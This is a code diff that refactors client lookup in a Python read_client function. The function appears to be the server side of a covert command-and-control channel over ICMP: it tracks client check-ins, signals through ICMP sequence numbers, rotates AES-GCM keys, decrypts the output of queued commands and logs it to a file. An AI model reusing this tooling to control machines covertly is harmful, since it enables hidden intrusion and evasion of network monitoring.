@@ -97,47 +97,51 @@ def read_client(packet):
 
             ## CLIENT HAS ALREADY CONNECTED
             else:
+                if client_manager.get_clients():
 
-                for client in client_manager.get_clients():
-                    # print(client.get_encrypted_hex_block())
-                    if packet[IP].src == client.get_id():
-                        if client.get_block() and 'Q' not in packet[Raw].load.decode():
-                            client.set_encrypted_hex_block(packet[Raw].load.decode())
+                    client = client_manager.get_client(packet[IP].src)
+                    if not isinstance(client, Client):
+                        print(f"Client '{packet[IP].src}' not registered")
+                        return
 
-                        client.update()
 
-                        if packet[ICMP].seq == 13 and not client.get_executed_command() == "cancel":
-                            client.set_command_executing(True)
+                    if client.get_block() and 'Q' not in packet[Raw].load.decode():
+                        client.set_encrypted_hex_block(packet[Raw].load.decode())
 
-                        if packet[ICMP].seq == 37:
-                            if client.get_executed_command() == "cancel":
-                                try:
-                                    client.set_client_response(
-                                        decrypt_msg_gcm(client.get_aes_key(), client.get_aes_nonce(),
-                                                        remove_padded_zeroes(client.get_encrypted_hex_block())))
-                                except Exception as error:
-                                    print("cancel An error occurred2:", error)
-                                    print()
-                            else:
-                                try:
-                                    # First packets from CLIENT is always "!ping" (this is the check-in packet to see if SERVER has commands waiting).
-                                    # We skip these packets, otherwise the decryption of the newly generated key and nonce fails.
-                                    if not (remove_padded_zeroes(client.get_encrypted_hex_block()) == client.get_ping_encrypted()) and (client.getUpdateAES() and client.get_ping_encrypted()):
-                                        client.updateAES()
-                                    else:
-                                        client.set_client_response(decrypt_msg_gcm(client.get_aes_key(), client.get_aes_nonce(), remove_padded_zeroes(client.get_encrypted_hex_block())))
+                    client.update()
 
-                                        # Storing the encrypted version of "!ping", so that it can be filtered out when decrypting data from CLIENT (like when updating AES key and nonce)
-                                        if not client.get_ping_encrypted() and client.get_client_response() == "!ping":
-                                            client.set_ping_encrypted(remove_padded_zeroes(client.get_encrypted_hex_block()))
+                    if packet[ICMP].seq == 13 and not client.get_executed_command() == "cancel":
+                        client.set_command_executing(True)
 
-                                        write_result_to_file(client)
-                                except Exception as error:
-                                    print("37 An error occurred:", error)
-                                    client.set_server_command("")
+                    if packet[ICMP].seq == 37:
+                        if client.get_executed_command() == "cancel":
+                            try:
+                                client.set_client_response(
+                                    decrypt_msg_gcm(client.get_aes_key(), client.get_aes_nonce(),
+                                                    remove_padded_zeroes(client.get_encrypted_hex_block())))
+                            except Exception as error:
+                                print("cancel An error occurred2:", error)
+                                print()
+                        else:
+                            try:
+                                # First packets from CLIENT is always "!ping" (this is the check-in packet to see if SERVER has commands waiting).
+                                # We skip these packets, otherwise the decryption of the newly generated key and nonce fails.
+                                if not (remove_padded_zeroes(client.get_encrypted_hex_block()) == client.get_ping_encrypted()) and (client.getUpdateAES() and client.get_ping_encrypted()):
+                                    client.updateAES()
+                                else:
+                                    client.set_client_response(decrypt_msg_gcm(client.get_aes_key(), client.get_aes_nonce(), remove_padded_zeroes(client.get_encrypted_hex_block())))
 
-                            status = client.handle_response()
-                            if status == "disconnected":
-                                return "disconnected"
-                            else:
-                                client.cleanup()
+                                    # Storing the encrypted version of "!ping", so that it can be filtered out when decrypting data from CLIENT (like when updating AES key and nonce)
+                                    if not client.get_ping_encrypted() and client.get_client_response() == "!ping":
+                                        client.set_ping_encrypted(remove_padded_zeroes(client.get_encrypted_hex_block()))
+
+                                    write_result_to_file(client)
+                            except Exception as error:
+                                print("37 An error occurred:", error)
+                                client.set_server_command("")
+
+                        status = client.handle_response()
+                        if status == "disconnected":
+                            return "disconnected"
+                        else:
+                            client.cleanup()
